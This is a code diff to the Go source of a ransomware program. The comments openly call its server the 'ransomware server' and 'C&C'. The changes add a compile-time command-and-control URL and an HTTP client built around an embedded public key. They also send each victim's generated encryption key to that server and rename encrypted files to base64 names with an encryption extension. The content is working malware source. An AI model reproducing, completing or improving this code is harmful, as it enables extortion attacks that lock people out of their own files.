@@ -8,7 +8,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
-	"net/url"
 	"os"
 	"path/filepath"
 	"strings"
@@ -24,6 +23,12 @@ import (
 var (
 	// Time to keep trying persist new keys on server
 	SecondsToTimeout = 5.0
+
+	// ServerBaseURL is the server base url injected on compile time
+	ServerBaseURL string
+
+	// Client is the client for the ransomware server
+	Client *client.Client
 
 	// Create a struct to store the files to rename after encryption
 	FilesToRename struct {
@@ -46,6 +51,15 @@ func init() {
 }
 
 func main() {
+	// Read the go-bindata embedded public key
+	pubkey, err := Asset("public.pem")
+	if err != nil {
+		cmd.Logger.Println(err)
+	}
+
+	// http client instance
+	Client = client.New(ServerBaseURL, pubkey)
+
 	// Hannibal ad portas
 	encryptFiles()
 
@@ -70,20 +84,18 @@ func encryptFiles() {
 		keys["id"], _ = utils.GenerateRandomANString(32)
 		keys["enckey"], _ = utils.GenerateRandomANString(32)
 
-		// Create the json payload
-		payload := fmt.Sprintf(`{"id": "%s", "enckey": "%s"}`, keys["id"], keys["enckey"])
-
-		// Encrypt the payload and send to server
-		res, err := client.SendPayload("/api/keys/add", payload, url.Values{})
+		// Persist the key pair on server
+		res, err := Client.AddNewKeyPair(keys["id"], keys["enckey"])
 		if err != nil {
-			cmd.Logger.Println("The server refuse connection. Aborting...")
+			cmd.Logger.Println("Ops, something went terribly wrong when contacting the C&C... Aborting...")
+			cmd.Logger.Println(err)
 			return
 		}
 
 		// handle possible response statuses
 		switch res.StatusCode {
 		case 200, 204:
-			// \o/
+			// \o/ Well done
 			break
 		default:
 			response := struct {
@@ -218,8 +230,9 @@ func encryptFiles() {
 		// Replace the file name by the base64 equivalent
 		newpath := strings.Replace(file.Path, file.Name(), base64.StdEncoding.EncodeToString([]byte(file.Name())), -1)
 
+		cmd.Logger.Printf("Renaming %s to %s\n", file.Path, newpath)
 		// Rename the original file to the base64 equivalent
-		err := os.Rename(file.Path, newpath+cmd.EncryptionExtension)
+		err := utils.RenameFile(file.Path, newpath+cmd.EncryptionExtension)
 		if err != nil {
 			cmd.Logger.Println(err)
 			continue
